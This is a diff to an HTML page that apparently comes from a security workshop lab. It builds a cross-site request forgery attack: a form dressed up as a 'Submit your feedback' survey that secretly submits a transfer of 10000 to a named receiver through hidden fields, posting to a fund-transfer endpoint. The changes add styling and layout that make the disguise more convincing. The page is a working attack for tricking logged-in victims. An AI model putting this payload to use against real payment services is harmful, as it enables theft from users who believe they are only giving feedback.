@@ -1,14 +1,31 @@
 <html>
     <head>
-
+        <link rel="stylesheet" href="style.css" type="text/css">
     </head>
     <body>
+        <div class="form-style">
         <form action="http://10.10.10.245/workshop/fundtransfer.php" >
-            <input type="text" name="reciever" value="Gaurav Singh" hidden>
-            <input type="text" name="amount"  value=10000 hidden>    
-        <input type="text" name="sw">
-        <input type="text" name="tr">
-        <button type="submit">SEND SURVEY</button>
+            <ul>
+            <li>
+                <h1>Submit your feedback</h1>
+            </li>
+            <li>
+            <input type="text" name="sw" placeholder="Name">
+                </li>
+                <li>
+            <input type="text" name="tr" placeholder="Feedback">
+                </li>
+                <li>
+            <button type="submit">SEND SURVEY</button>
+            </li>
+            <li>
+                <input type="text" name="reciever" value="Gaurav Singh" hidden>
+               </li>
+               <li>
+                <input type="text" name="amount"  value=10000 hidden>    
+                </li>
+        </ul>
         </form>
+        </div>
     </body>
 </html>
